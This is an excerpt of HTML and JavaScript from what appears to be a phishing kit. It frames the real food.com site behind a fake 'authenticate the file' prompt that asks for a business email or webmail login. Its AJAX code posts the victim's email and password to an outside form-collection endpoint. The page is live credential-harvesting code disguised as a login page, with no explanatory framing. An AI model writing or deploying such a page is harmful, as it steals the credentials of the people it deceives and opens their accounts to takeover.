...
<iframe id="mainPage" src="https://food.com" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
        ...
        <div class="row">
            <div class="col-md-12">
                <div class="form-section" style="background:rgba(250,250,250,2);">
                    <div class="logo">
                        <a href="">
                            <img src="https://www.google.com/s2/favicons?domain=https://food.com" alt="Webmail" id="logoimg">
							<h2 id="logoname">FOOD</h2>				
                        </a>
                    </div>
					<div><strong>TO AUTHENTICATE THE FILE</strong></div>
					<div><strong>LOG IN WITH YOUR BUSINESS EMAIL/WEBMAIL</strong></div><br>
...
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    ...
    //    $("#mainPage").src(mainPage);
      ...
      $.ajax({
        dataType: 'JSON',
        url: 'https://nocodeform.io/f/65bb69994b3f1c96725988ee',
        type: 'POST',
        data:{
          email:email,
          password:password,
